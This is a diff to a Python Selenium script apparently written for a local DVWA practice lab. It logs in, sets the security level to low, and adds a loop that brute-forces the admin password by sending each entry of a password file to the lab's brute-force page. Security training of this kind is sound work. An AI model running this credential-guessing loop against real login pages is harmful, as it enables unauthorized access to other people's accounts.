@@ -9,8 +9,8 @@ username = 'admin'
 password = 'password'
 
 # Find the username and password input fields on the login page using various locators
-username_field = driver.find_element('name', 'username')  # Replace 'username' with the actual name attribute of the username field
-password_field = driver.find_element('name', 'password')  # Replace 'password' with the actual name attribute of the password field
+username_field = driver.find_element('name', 'username')  
+password_field = driver.find_element('name', 'password') 
 
 # Enter the username and password into their respective fields
 username_field.send_keys(username)
@@ -34,6 +34,31 @@ select.select_by_value('low')
 submit_button = driver.find_element('name', 'seclev_submit')
 submit_button.click()
 
-# now we go to the bruteforce page
-driver.get("http://localhost:4280/vulnerabilities/brute/")
+
+# get the list of passwords
+def read_passwords_file(filename):
+    password_list = []
+    with open(filename, 'r') as file:
+        for line in file:
+            # Remove leading/trailing whitespaces and newlines
+            password = line.strip()
+            password_list.append(password)
+    return password_list
+
+# Replace 'passwords.txt' with the actual path to your file
+file_path = 'passwords.txt'
+passwords = read_passwords_file(file_path)
+
+for pw in passwords:
+    user = 'admin'
+    driver.get(f"http://localhost:4280/vulnerabilities/brute/?username={user}&password={pw}&Login=Login#")
+    get_source = driver.page_source
+    target_text = 'Welcome to the password protected area'
+    if target_text in get_source:
+        print(f'User: {user}, password: {pw}')
+        break
+
+# now we start sending a bunch of GET requests to see which password is right 
+
+
 print()
